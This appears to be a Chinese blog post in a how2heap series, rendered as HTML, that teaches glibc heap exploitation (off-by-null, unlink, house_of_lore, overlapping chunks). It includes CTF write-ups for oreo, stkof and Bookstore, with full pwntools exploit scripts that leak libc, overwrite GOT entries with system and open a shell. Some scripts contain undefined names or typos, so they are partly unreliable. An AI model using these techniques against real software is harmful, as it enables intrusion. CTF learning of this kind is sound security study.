+<li><p>结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。我们在 fake chunk 中 size 部分对应的是 <code>newNum</code>，而这部分实际存储的内容是我们 <code>add</code> 的次数，我们可以控制它等于 0x40 同时保证标志位为 0 。而第二个fake chunk的数据区域就会在可编辑的 <code>0804A2C0</code> 区域，可以直接修改</p>
+</li>
+</ul>
+<p>fake chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sh=process(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name,des</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(name)<br>    sh.sendline(des)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>():<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">msg</span>(<span class="hljs-params">notice</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.sendline(notice)<br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(puts_got)<br>add(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>,payload1)<br>show()<br>sh.recvuntil(<span class="hljs-string">&#x27;Description: &#x27;</span>)<br>puts_adr=u32(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[:<span class="hljs-number">4</span>])<br>libc_base=puts_adr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_adr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>count=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> count&lt;<span class="hljs-number">0x40</span>-<span class="hljs-number">1</span>:<br>    add(<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>    count+=<span class="hljs-number">1</span><br>    <br>paload2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0x804a2a8</span>)<br>add(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>,payload2)<br><br>payload3=<span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x20</span>) + p32(<span class="hljs-number">0x40</span>) + p32(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#msg地址0x0804A2C0-0x0804A2A8=0x18  +8=0x20  </span><br>msg(payload3)<br><br>order()<br>add(<span class="hljs-string">&#x27;a&#x27;</span>,p32(sscanf_got)) <br><span class="hljs-comment">#这时bss段中可写的msg部分被分配出来，同时作为des的sscanf_got的地址被填充在msg顶部</span><br>msg(p32(system_adr))　　<span class="hljs-comment">#修改sscanf_got的内容为system_adr</span><br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h1><p>我感觉这个实际上就是 off-by-null </p>
+<p><strong>原理：</strong>伪造一个fake_chunk，并修改物理相邻的下一个 chunk 的 prev_inuse 位为 0 ，引起合并与 unlink ，最后再申请的时候就会从这一块合并的 chunk 中切割，overlap 这一块 chunk 。</p>
+<p><strong>知识点：</strong></p>
+<ul>
+<li>chunk 的 size 位低三位为标志位，分别是 <code>NON_MAIN_ARENA</code> 、<code>IS_MMAPPED</code> 、<code>PREV_INUSE</code>。其中<code>PREV_INUSE</code> 表示前面一个内存块是否被使用，0 表示不被使用（被 free了），1 表示正在被使用。</li>
+<li>FD-&gt;bk &#x3D;&#x3D; P &amp;&amp; BK-&gt;fd &#x3D;&#x3D; P。</li>
+</ul>
+<p>在这里实例中我们申请了四个 chunk，按照申请顺序分别记为 <em>a，b，c</em> 和一个防止堆块与 top chunk 合并的堆块。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/poison-chunk-all.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们想要构造的 fake chunk 在 <em>b</em> 对应的部分，需要用到的只有 chunk <em>b</em>，<em>c</em> 。我们将会在 fake b 里申请两个堆块，其中想要利用的堆块记作 victim。<strong>通常 victim 其中包含我们要控制的有价值的指针。</strong></p>
+<p>由此，需要在 <code>b+0x200</code> 处伪造一个 <code>fake prev_size</code>：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_fakeprev_size.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后 free 掉 <em>b</em>。</p>
+<p>假设我们现在在编辑 chunk <em>a</em> 的时候存在 off-by-null 漏洞，我们就可以通过编辑 a 来溢出到 <em>b</em> size 位的标志位，使得其从 211 变为 200。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_size.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_size2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时就和前面的操作对应，我们修改 <em>b</em> 的大小为 0x200，那么程序就会去 <em>b</em>+0x200 的地方查找它的 prev_size，而不是去 <em>c</em> 寻找。这样我们就绕过了 <code>chunksize(P) = prev_size(next_chunk(P))</code> 的检测。</p>
+<p>接下来申请一个 0x100 大小的 chunk <em>b1</em>，因为 <em>b</em> 已经被 free 了，所以 glibc 会将 <em>b</em> 进行切割，分出一块 <code>0x100</code> 大小的堆块给 <em>b1</em>，剩下 0xf0 。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候我们再回到伪造的 0x200 大小的 <em>fake_b</em> 的 prev_size 位变成了 0xf0</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_fakeprev_size2.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来再去申请一块小于 0xf0 的堆块记为 <em>victim</em>，这样就会继续分割 <em>b</em> 剩下的那一块</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_malloc_b2.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来 free 掉 <em>b1</em> 和 <em>c</em></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_free_b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为 <em>c</em> 的 <code>prev_size</code> 仍为是 <code>0x210</code>，所以会以此去合并原本的 b ，也就是说会将从当前的 b1 到 c 全部的内存区域合并，包含 <em>victim</em> 的内存区域。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_free_c.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是对于程序而言我们并没有 free <em>victim</em> 。</p>
+<p>接下来再申请一个大的堆块就可以对 victim 进行任意写操作啦。</p>
+<h3 id="🗡️真题实战-HITCON-CTF-2014-stkof"><a href="#🗡️真题实战-HITCON-CTF-2014-stkof" class="headerlink" title="🗡️真题实战 HITCON CTF 2014-stkof"></a>🗡️真题实战 HITCON CTF 2014-stkof</h3><p>题目是菜单题的基本逻辑，但是没有为用户输出菜单提示。直接接收用户的输入，可选1-4 实现不同的功能，依次分析各个函数基本对应下面的功能：</p>
+<ul>
+<li>v3 &#x3D;&#x3D; 1：<code>malloc(size)</code>，同时计数加一，堆块指针存储在全局变量 s 数组 中。size 由用户输入接收。</li>
+<li>v3 &#x3D;&#x3D; 2：读取 n 长度的字符串存储在最新的堆块当中。其中 n 的大小由用户输入接收，所以可以造成溢出。</li>
+<li>v3 &#x3D;&#x3D; 3：free 选中的堆块，堆块的选择由用户输入接收。</li>
+<li>v3 &#x3D;&#x3D; 4：读取 chunk 内容的长度并根据不同情况输出不同内容（没啥用处）</li>
+</ul>
+<blockquote>
+<p>看别的师傅分享的文章时发现了以前没关注过的小 tips ：</p>
+<p>setbuf() &#x2F; setvbuf() 函数作用：关闭 I&#x2F;O 缓冲区</p>
+<p>一般的程序为了让程序显示正常，会在代码中通过以下命令关闭 I&#x2F;O 缓冲区：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">&gt;<span class="hljs-built_in">setbuf</span>(stdin ,<span class="hljs-number">0</span>);<br>&gt;<span class="hljs-built_in">setbuf</span>(stdout,<span class="hljs-number">0</span>);<br>&gt;<span class="hljs-built_in">setbuf</span>(stderr,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>本题没有关闭缓冲区，函数运行开始阶段在 fgets() 函数以及 printf() 函数运行的时候，会 malloc() 两块内存区域。</p>
+</blockquote>
+<p>s 是一个存储在 .bss 段的指针，这种指针就是这类 unlink 题目的特征</p>
+<p><img src="D:/笔记/PWN/how2heap/stkof_s.png" srcset="/img/loading.gif" lazyload></p>
+<p>通用做题流程：</p>
+<p>设某一堆块的指针存储在 <code>pchunk</code> 地址处，在该堆块中伪造堆块，填充数据伪造堆头，利用填充堆块内容的函数将该堆块的 <em>fd</em> 和 <em>bk</em> 处分别修改为 <code>pchunk-0x18</code>，<code>pchunk-0x10</code>，然后将相邻的下一堆块的 <em>priv_size</em> 修改为伪造的堆块的大小，堆头 <em>size</em> 修改为相应的大小，然后释放相邻堆块（大小需为非 fastbin ）就可以触发 unlink ，将该堆块的指针修改为 <code>pchunk-0x18</code> 了。</p>
+<p>先把函数写了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, size, content</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br></code></pre></td></tr></table></figure>
+
+<p>我们申请三个块，第一个用与防止堆块与 top chunk 合并，第二个用来伪造 fake chunk ，第三个用来 free 造成 unlink 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x80</span>)<br></code></pre></td></tr></table></figure>
+
+<p>申请之后我们可以看到在 .bss 段就存储着新申请的堆块的信息</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_s_inf.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为我们要在 chunk 2 处伪造 fake chunk，然后 free chunk 3 ，所以我们就把存放 chunk 2 地址的地方，即0x602150 设为 ptr，然后进行 fake chunk 的构造以及溢出数据的写入。</p>
+<p>现在第二个和第三个 chunk 中的信息如下：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_chunk22.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ptr=<span class="hljs-number">0x602150</span> <br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure>
+
+<p>执行完这部分的代码后结构会变成下面这样：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_chunk2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时 chunk3 的 prev_inuse 位被置为0，表示前一个 chunk 为空闲状态，prev_size 也被改为了对应 fake chunk 的大小。这时我们就可以 free chunk3 了</p>
+<p>当我们 free chunk3 时，系统判断前一个 chunk 是否处于空闲状态，我们上面已经通过堆溢出布置好了 chunk3 ，因此系统认为前一个 chunk 处于空闲状态，并通过 chunk3 的位置和 prev_size 定位到前一个 chunk ，即伪造的 fake chunk。随后合并这两个 chunk，这时候要再进行判断，判断的条件就是：</p>
+<p><code>FD-&gt;bk=fake chunk &amp;&amp; BK-&gt;fd=fake chunk</code></p>
+<p>在本题情况中，FD&#x3D;fake chunk-&gt;fd、BK&#x3D;fake chunk-&gt;bk，即 <strong>FD&#x3D;0x602138、BK&#x3D;0x602140</strong>，所以就满足了<strong>FD-&gt;bk&#x3D;FD+0x18、BK-&gt;fd&#x3D;BK+0x10</strong> 而这两个结果都指向 fake chunk 的地址，因此我们便绕过了检测。</p>
+<p>而后会执行 <code>FD-&gt;bk=BK</code>、<code>BK-&gt;fd=FD</code>，即先把 0x602150 处存储的数据修改为 0x602140 ，然后再改为0x602138 也就是 <code>ptr-0x18</code> 。</p>
+<p>0x602150 处本应该存储着 chunk2 的地址，但现在已经被我们改掉了，我们就可以利用这一点，向 .bss 段写入数据，继续进行改写。这样我们就可以通过将指针改写为对应函数的 got 表地址进行泄露和改写，从而 getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>ptr=<span class="hljs-number">0x602150</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, size, content</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><br>malloc(<span class="hljs-number">0x100</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>free(<span class="hljs-number">3</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(puts_got)<br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>write(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(puts_plt))<br>free(<span class="hljs-number">3</span>)<span class="hljs-comment">#这个时候 free(3) 实际上就是 put(puts_plt)</span><br><br>base = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sh.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>system_addr=base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh&quot;</span><br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>write(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(system_addr))<br>free(<span class="hljs-number">3</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h1><p><strong>原理：</strong>这个攻击针对的是 smallbin ，通过修改 smallbin 中的 bk 指针，来申请任意地址。</p>
+<p><strong>知识点✨：</strong> </p>
+<ul>
+<li>在分配 smallbin 大小的堆块时，系统会检查链表倒数第二个堆块的 bk 指针是否指向第一块。</li>
+</ul>
+<p><strong>GDB 调试</strong></p>
+<p>我们主要的目的是伪造一条 small bins 链。</p>
+<p>我们首先申请两个 chunk，一个chunk 是我们想要利用的堆块，我们称其为 victim chunk，第二个用于防止与top chunk 合并。</p>
+<p>然后，在栈上伪造两个 fake chunk ，让 fake chunk 1 的 fd 指向 victim chunk ，bk 指向 fake chunk 2 ，fake chunk 2 的 fd 指向 fake chunk 1，这样一个 small bin 链就差不多了。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_lore_victim.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来我们 free victim，它会进入 fastbin 。这时候我们再去 malloc 一个大的 chunk ，就会触发 fast bin 的合并，victim 会放到 unsorted bin 中，最终被整理回到 small bin。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_lore_free.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在我们假设存在一个可以覆盖 victim 的 bk 指针的漏洞，让它的 bk 指针指向栈上。</p>
+<p>这样，我们申请一个和 victim 同样大小的 chunk，会把空闲的 victim 分配出去。而后再申请堆块，就会到 victim-&gt;bk 处，即栈上去寻找堆块。</p>
+<p>这样我们就成功地骗过了 malloc 在栈上分配了一个 chunk。</p>
+<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><blockquote>
+<p>这一部分在 how2heap 里是分 1 和 2 的，1 的原理是：通过溢出漏洞修改空闲堆块的 size ，将地址相邻的两个 chunk “合并”。 如果 free 后再次申请一个大小匹配的堆块，就会堆块的重叠。</p>
+<p>比较简单一看就懂，就略过直接开始 2 了</p>
+</blockquote>
+<p><strong>原理：</strong>在释放堆块之前修改它的 size 大小，等它被释放后，错误地修改下一个 chunk 的 prev_size，导致中间的chunk 强行合并。</p>
+<p><strong>GDB 调试</strong></p>
+<p>我们在本次实验中共分配五个堆块，其中第一个堆块用于模拟溢出漏洞来改写第二个堆块的数据，我们目标重叠的部分是第二至第四个堆块，第五个堆块用于防止与 top chunk 合并。</p>
+<p>我们先 free chunk 4 </p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free4.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来，我们利用 chunk1 的溢出漏洞来改写 chunk2 的 size 值。将 size 改为 chunk2 和 chunk3 的大小之和，在本次实例中就是 <code>0x3f0+0x3f0+0x1=0x7e1</code></p>
+<p>这时我们再 free 2，根据这个被修改的 size 值，程序会以为 chunk 2 加上 chunk 3 的区域都是要释放的，就会错误地修改了chunk 5的 prev_size 。</p>
+<p>接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free2.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样，我们就对 chunk3 造成了重叠，可以改写其中的内容了。</p>
+<h3 id="🗡️真题实战-Hack-lu-CTF-2015-Bookstore"><a href="#🗡️真题实战-Hack-lu-CTF-2015-Bookstore" class="headerlink" title="🗡️真题实战 Hack.lu CTF 2015 Bookstore"></a>🗡️真题实战 Hack.lu CTF 2015 Bookstore</h3><p>题目是一个订书系统，选项1-5 对应 1、2 编辑订单信息，3、4删除订单信息，5 提交订单信息。</p>
+<p>其中1、2 的编辑功能用同一个函数实现，存在溢出漏洞</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/bookstore_edit.png" srcset="/img/loading.gif" lazyload></p>
+<p>删除订购单是 free 掉了对应的指针，没有把指针指针置为 NULL，存在 UAF 漏洞。</p>
+<p>最后提交功能中有格式化字符串漏洞，但是这个漏洞在 submit 功能中，只能利用一次。</p>
+<ul>
+<li>首先考虑如何利用格式化字符串的漏洞：</li>
+</ul>
+<p>我们必须得要控制 dest 的内容才能进行漏洞的利用，那么该如何控制呢？程序最开始的时候分配了三个连续的堆块 <em>v6</em>、<em>v7</em> 和 <em>dest</em>，我们可以通过溢出 <em>v7</em> 来修改 <em>dest</em> 的内容。但是最后会被改写为固定的内容 “Your order is submitted”。</p>
+<blockquote>
+<p>真奇怪我看花眼也没看出来哪里给它赋值了</p>
+</blockquote>
+<p>在最后执行 submitted 的时候会申请一个 <em>v5</em> ，这个堆块的指针是不确定的，我们可以从 top chunk 里重新分配，也可以 free 掉 <em>v6</em> 、<em>v7</em>，从他们当中分配。这样，我们就可以利用 overlapping ，利用 <em>v7</em> 实现 dest 部分的堆重叠，从而在 submitted 时改写 <em>dest</em> 。</p>
+<ul>
+<li>因为我们首先需要利用格式化字符串泄露基址，然后需要再利用一次去改写地址，所以接下来考虑如何多次利用格式化字符串：</li>
+</ul>
+<p>在接收用户选择输入时，允许用户输入 128 长度的字符串，但是长度不够去利用栈溢出到返回地址，所以我们需要利用其他的方法。</p>
+<p>我们需要用到另外一个知识点：<strong>程序退出后会执行 <code>.fini_array</code> 地址处的函数，不过只能利用一次。</strong></p>
+<h4 id="中插知识点之-init-array-和-fini-array-节！"><a href="#中插知识点之-init-array-和-fini-array-节！" class="headerlink" title="中插知识点之 .init_array 和  .fini_array 节！"></a>中插知识点之 .init_array 和  .fini_array 节！</h4><blockquote>
+<p>大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。</p>
+<p>.init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写 .fini_array 函数指针。</p>
+<p>对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。</p>
+</blockquote>
+<p>我们可以利用如下代码自己实验一下 .ini_array 和 .fini_array 的指针属性：</p>
